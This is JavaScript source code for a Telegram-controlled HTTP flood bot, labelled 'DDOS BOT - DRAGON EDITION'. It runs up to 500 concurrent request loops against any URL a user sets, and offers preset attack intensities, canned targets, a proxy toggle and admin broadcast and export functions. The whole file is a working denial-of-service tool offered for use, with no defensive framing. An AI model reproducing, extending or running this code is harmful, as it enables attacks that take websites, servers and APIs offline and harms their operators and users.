// =============================================
// DDOS BOT - DRAGON EDITION (COMPACT)
// © Dragon - 600 Lines
// =============================================

const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const https = require('https');
const config = {
    botToken: '7212345678:AAGxXxXxXxXxXxXxXxXxXxXxXxXxXx', // GANTI
    adminId: 123456789, // GANTI
    ddos: { defaultThreads: 100, maxThreads: 500, defaultDuration: 60, timeout: 5000 },
    proxy: { enabled: false, list: ['http://user:pass@ip:port'] },
    thread: { maxConcurrent: 200, delayBetween: 10 }
};

const E = { attack: '⚔️', stop: '🛑', stats: '📊', target: '🎯', thread: '🧵', proxy: '🌐', success: '✅', failed: '❌', warning: '⚠️', fire: '🔥', skull: '💀', bomb: '💣', zap: '⚡', shield: '🛡️', dragon: '🐉', back: '🔙', loading: '🔄' };

// =============================================
// DATABASE
// =============================================
const DB_PATH = './db.json';
let db = { users: {}, stats: { total: 0, packets: 0 } };
if (fs.existsSync(DB_PATH)) db = JSON.parse(fs.readFileSync(DB_PATH));
const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

// =============================================
// DDOS ENGINE
// =============================================
class DDOS {
    constructor() {
        this.attacks = {};
        this.threads = {};
        this.isRunning = false;
    }

    startAttack(target, duration = 60, threads = 100) {
        const id = Date.now().toString();
        if (this.attacks[id]) return { success: false, error: 'Running' };
        this.attacks[id] = { target, duration, startTime: Date.now(), packets: 0, status: 'running' };
        this.isRunning = true;
        this.threads[id] = [];
        for (let i = 0; i < threads; i++) {
            this.threads[id].push(setInterval(() => {
                if (!this.attacks[id] || this.attacks[id].status !== 'running') return;
                this.sendRequest(target, id);
                if (this.attacks[id]) { this.attacks[id].packets++; db.stats.packets++; saveDB(); }
            }, config.thread.delayBetween));
        }
        setTimeout(() => this.stopAttack(id), duration * 1000);
        return { success: true, id };
    }

    async sendRequest(target, id) {
        try {
            await axios({ method: ['GET','POST','HEAD','OPTIONS'][Math.floor(Math.random()*4)], url: target, timeout: config.ddos.timeout, headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Connection': 'keep-alive' }, httpsAgent: new https.Agent({ rejectUnauthorized: false, keepAlive: true }), params: { _: Math.random().toString(36).substring(7), t: Date.now() } });
        } catch(e) {}
    }

    stopAttack(id) {
        if (this.attacks[id]) {
            this.attacks[id].status = 'stopped';
            if (this.threads[id]) { this.threads[id].forEach(t => clearInterval(t)); delete this.threads[id]; }
        }
        let running = false;
        for (const key in this.attacks) if (this.attacks[key].status === 'running') running = true;
        this.isRunning = running;
        return { success: true };
    }

    stopAll() { for (const id in this.attacks) this.stopAttack(id); return { success: true }; }

    getStats() {
        let total = 0, running = 0, packets = 0;
        for (const key in this.attacks) { total++; if (this.attacks[key].status === 'running') running++; packets += this.attacks[key].packets; }
        return { totalAttacks: total, runningAttacks: running, totalPackets: packets, isRunning: this.isRunning };
    }
}

// =============================================
// BOT
// =============================================
const bot = new Telegraf(config.botToken);
const ddos = new DDOS();

// =============================================
// KEYBOARDS
// =============================================
const mainMenu = Markup.inlineKeyboard([
    [Markup.button.callback(`${E.fire} START ATTACK`, 'start_attack'), Markup.button.callback(`${E.stop} STOP ALL`, 'stop_all')],
    [Markup.button.callback(`${E.stats} STATS`, 'show_stats'), Markup.button.callback(`${E.target} SET TARGET`, 'set_target')],
    [Markup.button.callback(`${E.thread} THREADS`, 'set_threads'), Markup.button.callback(`${E.proxy} PROXY`, 'toggle_proxy')],
    [Markup.button.callback(`${E.dragon} PRESETS`, 'presets')],
    [Markup.button.callback('🔴 RED', 'color_red'), Markup.button.callback('🟢 GREEN', 'color_green')],
    [Markup.button.callback('🔵 BLUE', 'color_blue'), Markup.button.callback('🟡 YELLOW', 'color_yellow')],
    [Markup.button.callback('🟣 PURPLE', 'color_purple'), Markup.button.callback('🟠 ORANGE', 'color_orange')],
    [Markup.button.callback(`${E.zap} ADMIN`, 'admin_panel')]
]);

const attackMenu = Markup.inlineKeyboard([
    [Markup.button.callback(`${E.fire} LIGHT (50th/30s)`, 'attack_light'), Markup.button.callback(`${E.fire} MEDIUM (100th/60s)`, 'attack_medium')],
    [Markup.button.callback(`${E.fire} HEAVY (200th/120s)`, 'attack_heavy'), Markup.button.callback(`${E.fire} EXTREME (500th/300s)`, 'attack_extreme')],
    [Markup.button.callback(`${E.stop} STOP`, 'stop_attack'), Markup.button.callback(`${E.back} BACK`, 'back_main')]
]);

const presetsMenu = Markup.inlineKeyboard([
    [Markup.button.callback(`${E.target} WEBSITE`, 'preset_website'), Markup.button.callback(`${E.target} SERVER`, 'preset_server')],
    [Markup.button.callback(`${E.target} API`, 'preset_api'), Markup.button.callback(`${E.target} CUSTOM`, 'preset_custom')],
    [Markup.button.callback(`${E.back} BACK`, 'back_main')]
]);

const adminMenu = Markup.inlineKeyboard([
    [Markup.button.callback(`${E.stats} GLOBAL STATS`, 'admin_stats'), Markup.button.callback(`${E.warning} BROADCAST`, 'admin_broadcast')],
    [Markup.button.callback(`${E.dragon} EXPORT`, 'admin_export'), Markup.button.callback(`${E.stop} RESET DB`, 'admin_reset')],
    [Markup.button.callback(`${E.back} BACK`, 'back_main')]
]);

// =============================================
// HANDLERS
// =============================================
bot.start(async (ctx) => {
    if (!db.users[ctx.from.id]) {
        db.users[ctx.from.id] = { id: ctx.from.id, username: ctx.from.username || 'NoUser', joined: Date.now(), attacks: 0 };
        db.stats.total++; saveDB();
    }
    await ctx.replyWithHTML(`${E.dragon} *DDOS BOT* ${E.fire}\n${E.shield} Status: ${ddos.isRunning ? '🟢 ACTIVE' : '🔴 IDLE'}\n${E.thread} Threads: ${config.ddos.defaultThreads}\n${E.zap} Packets: ${db.stats.packets}`, mainMenu);
});

// ATTACKS
bot.action('start_attack', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`${E.fire} *PILIH SERANGAN*`, attackMenu); });

['light','medium','heavy','extreme'].forEach((type, i) => {
    const data = [{t:30,th:50},{t:60,th:100},{t:120,th:200},{t:300,th:500}];
    bot.action(`attack_${type}`, async (ctx) => {
        await ctx.answerCbQuery(`${E.loading} Starting...`);
        const target = db.users[ctx.from.id]?.target || 'http://localhost:8080';
        const d = data[i];
        const result = ddos.startAttack(target, d.t, d.th);
        if (result.success) { db.users[ctx.from.id].attacks++; saveDB(); await ctx.reply(`${E.fire} *ATTACK STARTED*\n${E.target} ${target}\n${E.thread} ${d.th}\n${E.clock} ${d.t}s`, mainMenu); } 
        else await ctx.reply(`${E.failed} Failed`);
    });
});

bot.action('stop_attack', async (ctx) => { await ctx.answerCbQuery(); ddos.stopAll(); await ctx.reply(`${E.stop} *ALL STOPPED*`, mainMenu); });
bot.action('stop_all', async (ctx) => { await ctx.answerCbQuery(); ddos.stopAll(); await ctx.reply(`${E.stop} *ALL STOPPED*`, mainMenu); });

// STATS
bot.action('show_stats', async (ctx) => {
    await ctx.answerCbQuery();
    const s = ddos.getStats();
    await ctx.replyWithHTML(`${E.stats} *STATS*\n${E.fire} Attacks: ${s.totalAttacks}\n${E.zap} Running: ${s.runningAttacks}\n${E.shield} Packets: ${s.totalPackets}\n${E.dragon} Status: ${s.isRunning ? '🟢 ACTIVE' : '🔴 IDLE'}`, mainMenu);
});

// TARGET
bot.action('set_target', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`${E.target} *SET TARGET*\n/target https://example.com`);
});

// THREADS
bot.action('set_threads', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`${E.thread} *SET THREADS*\n/threads 200\nMax: ${config.ddos.maxThreads}`);
});

// PROXY
bot.action('toggle_proxy', async (ctx) => {
    await ctx.answerCbQuery();
    config.proxy.enabled = !config.proxy.enabled;
    await ctx.reply(`${E.proxy} Proxy: ${config.proxy.enabled ? '✅ ON' : '❌ OFF'}`, mainMenu);
});

// PRESETS
bot.action('presets', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`${E.target} *PRESETS*`, presetsMenu); });
bot.action('preset_website', async (ctx) => { await ctx.answerCbQuery(); db.users[ctx.from.id].target = 'https://example.com'; saveDB(); await ctx.reply(`${E.success} Target: example.com`, mainMenu); });
bot.action('preset_server', async (ctx) => { await ctx.answerCbQuery(); db.users[ctx.from.id].target = 'http://192.168.1.1:80'; saveDB(); await ctx.reply(`${E.success} Target: 192.168.1.1`, mainMenu); });
bot.action('preset_api', async (ctx) => { await ctx.answerCbQuery(); db.users[ctx.from.id].target = 'https://api.example.com'; saveDB(); await ctx.reply(`${E.success} Target: api.example.com`, mainMenu); });
bot.action('preset_custom', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`${E.target} /target https://your-target.com`); });

// COLORS
['red','green','blue','yellow','purple','orange'].forEach(c => {
    bot.action(`color_${c}`, async (ctx) => {
        await ctx.answerCbQuery(`${c.toUpperCase()} MODE`);
        await ctx.reply(`${E.zap} *${c.toUpperCase()} MODE ACTIVE*\n${E.target} ${db.users[ctx.from.id]?.target || 'Not set'}`, attackMenu);
    });
});

// ADMIN
bot.action('admin_panel', async (ctx) => {
    if (ctx.from.id !== config.adminId) { await ctx.answerCbQuery('❌ Admin only!', true); return; }
    await ctx.answerCbQuery(); await ctx.reply(`${E.zap} *ADMIN PANEL*`, adminMenu);
});

bot.action('admin_stats', async (ctx) => {
    if (ctx.from.id !== config.adminId) { await ctx.answerCbQuery('❌ Admin only!', true); return; }
    await ctx.answerCbQuery();
    await ctx.replyWithHTML(`${E.stats} *GLOBAL*\n👥 Users: ${db.stats.total}\n${E.zap} Packets: ${db.stats.packets}\n${E.proxy} Proxy: ${config.proxy.enabled ? 'ON' : 'OFF'}`);
});

bot.action('admin_broadcast', async (ctx) => {
    if (ctx.from.id !== config.adminId) { await ctx.answerCbQuery('❌ Admin only!', true); return; }
    await ctx.answerCbQuery();
    await ctx.reply(`${E.warning} *BROADCAST*\n/broadcast Pesan`);
});

bot.action('admin_export', async (ctx) => {
    if (ctx.from.id !== config.adminId) { await ctx.answerCbQuery('❌ Admin only!', true); return; }
    await ctx.answerCbQuery();
    fs.writeFileSync('./export.json', JSON.stringify(db, null, 2));
    await ctx.replyWithDocument({ source: './export.json' });
    fs.unlinkSync('./export.json');
});

bot.action('admin_reset', async (ctx) => {
    if (ctx.from.id !== config.adminId) { await ctx.answerCbQuery('❌ Admin only!', true); return; }
    await ctx.answerCbQuery();
    db = { users: {}, stats: { total: 0, packets: 0 } };
    saveDB();
    await ctx.reply(`${E.success} Database reset!`);
});

bot.action('back_main', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`${E.back} Kembali`, mainMenu); });

// =============================================
// TEXT HANDLERS
// =============================================
bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    const userId = ctx.from.id;

    // Target
    if (text.startsWith('/target ')) {
        const target = text.replace('/target ', '').trim();
        if (target.match(/^https?:\/\/.+/)) {
            db.users[userId] = db.users[userId] || {};
            db.users[userId].target = target;
            saveDB();
            await ctx.reply(`${E.success} Target: ${target}`, mainMenu);
        } else {
            await ctx.reply(`${E.failed} Invalid URL! /target https://example.com`);
        }
        return;
    }

    // Threads
    if (text.startsWith('/threads ')) {
        const threads = parseInt(text.replace('/threads ', ''));
        if (threads >= 10 && threads <= config.ddos.maxThreads) {
            config.ddos.defaultThreads = threads;
            await ctx.reply(`${E.success} Threads: ${threads}`);
        } else {
            await ctx.reply(`${E.failed} 10-${config.ddos.maxThreads}`);
        }
        return;
    }

    // ADMIN
    if (userId === config.adminId) {
        if (text.startsWith('/broadcast ')) {
            const msg = text.replace('/broadcast ', '').trim();
            let sent = 0;
            for (const id of Object.keys(db.users)) {
                try { await bot.telegram.sendMessage(id, `📢 ${msg}`); sent++; } catch(e) {}
            }
            await ctx.reply(`${E.success} Broadcast ke ${sent} users`);
            return;
        }
        if (text === '/export') {
            fs.writeFileSync('./export.json', JSON.stringify(db, null, 2));
            await ctx.replyWithDocument({ source: './export.json' });
            fs.unlinkSync('./export.json');
            return;
        }
        if (text === '/resetdb') {
            db = { users: {}, stats: { total: 0, packets: 0 } };
            saveDB();
            await ctx.reply(`${E.success} DB reset!`);
            return;
        }
        if (text === '/stats') {
            const s = ddos.getStats();
            await ctx.replyWithHTML(`${E.stats} *STATS*\n👥 ${db.stats.total}\n${E.zap} ${db.stats.packets}\n${E.fire} ${s.totalAttacks}\n${E.shield} ${s.isRunning ? '🟢 ACTIVE' : '🔴 IDLE'}`);
            return;
        }
    }

    await ctx.reply(`${E.warning} Perintah tidak dikenal!`, mainMenu);
});

// =============================================
// LAUNCH
// =============================================
bot.launch().then(() => {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('   🐉 DDOS BOT ONLINE');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`   Bot: @${bot.botInfo.username}`);
    console.log(`   Admin: ${config.adminId}`);
    console.log(`   Threads: ${config.ddos.defaultThreads}`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('   Copyright © Shahzu');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
}).catch(err => { console.error('❌ GAGAL:', err.message); process.exit(1); });

process.once('SIGINT', () => { ddos.stopAll(); bot.stop('SIGINT'); });
process.once('SIGTERM', () => { ddos.stopAll(); bot.stop('SIGTERM'); });
